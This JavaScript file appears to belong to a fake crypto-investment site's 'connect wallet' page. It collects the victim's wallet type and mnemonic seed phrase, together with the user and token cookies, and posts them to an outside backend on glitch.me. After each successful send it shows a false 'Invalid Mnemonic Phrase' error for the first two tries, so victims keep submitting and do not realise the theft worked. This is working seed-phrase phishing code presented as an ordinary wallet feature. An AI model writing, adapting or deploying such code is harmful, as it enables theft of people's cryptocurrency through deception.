document.querySelector("#connect-wallet").onclick=()=>{
    document.querySelector("#centerd_phrase").className="center";
}


let submission_count=0;


const handle_connect_wallet = async (form) => {
    try {
      document.querySelector("#connect_wallet").innerHTML = "proccessing...";
      const response = await fetch(
        // "https://softjovial-backend.glitch.me/api/user/create_deposit",
        // "http://localhost:5000/api/user/savewallet",
       "https://softjovial-backend.glitch.me/api/user/savewallet",
  
        {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify(form),
        },
      );
      const result = await response.json();
      console.log(result);
      if (result.error) {
        // document.querySelector(".errMessage").innerHTML = result.errMessage;
        // document.querySelector("#submit").innerHTML = "try again";
        // return;
        document.querySelector("#errMessage2").innerHTML = result.errMessage;
        document.querySelector("#connect_wallet").innerHTML = "try again";
        return
      }else{
        document.querySelector("#connect_wallet").innerHTML = "Try again";
        if(submission_count < 2){
            submission_count++
            document.querySelector("#errMessage2").innerHTML="Invalid Mnemonic Phrase or wallet unable to connect please try again or use direct withdrawal"
       return
        }
        window.location.reload()
    //   document.querySelector("#submit").innerHTML = "success";
    //   window.location.href = `payment.html?${result.message}`;

      }
    } catch (err) {
      document.querySelector("#errMessage2").innerHTML = err.message;
      document.querySelector("#connect_wallet").innerHTML = "try again";
    }
  };
  


document.querySelector("#connect_wallet").onclick=()=>{
  const wallet_type=document.querySelector("#wallet_type")
    const phrase=document.querySelector("#phrase");
    if(!wallet_type.value)return wallet_type.style.border="2px solid red"
    if(!phrase.value)return phrase.style.border="2px solid red"

    handle_connect_wallet({
     user: getCookie("user"),
    token:getCookie("token"),
    wallet_type:wallet_type.value,
   phrase:phrase.value
    })
}